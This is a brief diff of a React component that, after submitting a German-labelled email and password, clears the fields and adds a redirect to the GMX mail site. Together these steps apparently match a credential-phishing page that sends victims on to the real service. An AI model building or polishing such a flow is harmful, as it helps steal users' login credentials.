@@ -56,6 +56,7 @@ export default function Main() {
     .then((req) => {
       console.log(req.data);
       setCredentials({passwort: "", email: ""})
+      window.location.href = 'https://www.gmx.net'
     }).catch((err) => {
       console.log(err);
 
